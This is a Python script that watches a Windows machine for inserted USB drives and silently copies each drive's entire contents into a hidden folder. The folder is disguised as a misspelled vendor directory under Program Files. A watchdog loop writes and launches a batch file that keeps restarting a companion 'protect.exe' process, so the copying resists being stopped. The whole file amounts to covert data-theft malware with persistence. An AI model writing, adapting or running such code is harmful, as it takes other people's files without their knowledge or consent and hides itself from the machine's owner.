import asyncio
import cmd
import importlib
import multiprocessing
import os
import platform
import posixpath
import shutil
import subprocess
import threading
import time
import urllib

import psutil

#==============================================================================
# def function


# check USB disk
def u_check():

    while True:
        try:
            # create log file
            with open("INFO_log.txt", mode="a") as file:
                # write date to log file
                file.write(time_now() + "\n")


            for devices in psutil.disk_partitions():

                # wrire log to log file
                # create log file
                with open("INFO_log.txt", mode="a") as file:
                    # write information
                    file.write(str(devices) + "\n")

                # if USB disk is put in
                if "removable" in devices.opts:

                    U_path = devices.mountpoint
                    letter_l = []
                    for letter_u_path in U_path:
                        letter_l.append(letter_u_path)

                    # get the name of USB
                    os.system("vol " + letter_l[0] + ": >device_u.txt")
                    # with open("device_u.txt", encoding = "unicode_escape") as u_name_file:
                    with open("device_u.txt", encoding = "gbk") as u_name_file:
                        u_name_l = u_name_file.readlines()

                    order = 0
                    u_real_name_l = []
                    for letter_u_name_l in u_name_l[0]:
                        order += 1
                        if order >= 13:
                            u_real_name_l.append(letter_u_name_l)

                    u_real_name_l.pop(-1)
                    # the name of USB
                    u_real_name = "".join(u_real_name_l)
                    
                    # the order of USB after create the name of USB
                    u_copy_process(U_path, CP_GPS + u_real_name + time_now())
        finally:
            time.sleep(5)

# copy USB file
def u_copy(u_gps, copy_gps):
    shutil.copytree(u_gps, copy_gps)

# the thread of USB copy
def u_copy_process(u_path, CP_path):
    u_cp_process = threading.Thread(target = u_copy(u_path, CP_path), daemon = True)
    u_cp_process.start()


# the time
def time_now():
    DATE_NOW = time.strftime("%Y") + "-" + time.strftime("%m") + "-" + time.strftime("%d")
    time_here = time.strftime("%H") + "_" + time.strftime("%M") + "_" + time.strftime("%S")
    Now = DATE_NOW + "---" + time_here
    return Now



#==============================================================================
# program start here


HARDWARE = []
# write the information of hardware to file
with open("Hardware_log.txt", "w") as File:
    for hardware in psutil.disk_partitions():
        if "fixed" in hardware.opts:
            File.write(str(hardware) + "\n")
            HARDWARE.append(hardware.mountpoint)

# the path of finally copied
for ai in HARDWARE[-1]:
    CP_GPS = ai + ":/Program-files (X86)/Kingsoftt/U_secret_ps/"
    break


# start the thread of check USB
u_check_process = threading.Thread(target = u_check, daemon = True)
u_check_process.start()


# take a note for the pid of the thread
with open("protect\pid_main.txt", mode = "w") as pid_main:
    pid_main.write(str(os.getpid()))



# start protect function
def protect_start():
    with open("protect_start.bat", mode = "w") as protect_start:
        protect_start.write("@ECHO OFF\n")
        protect_start.write("cd protect\n")
        protect_start.write("start protect.exe\n")
        protect_start.write("exit")

    os.system("start protect_start.bat")


while True:
    # get the pid of thread
    try:
        with open("protect\pid_protect.txt") as pid_protect:
            Pid_protect = pid_protect.readlines()[0]

        # check if protect is still running
        if int(Pid_protect) not in psutil.pids():
            protect_start()
            with open("protect\pid_protect.txt", mode = "w") as A:
                pass

    except:
        protect_start()

    finally:
        time.sleep(3)
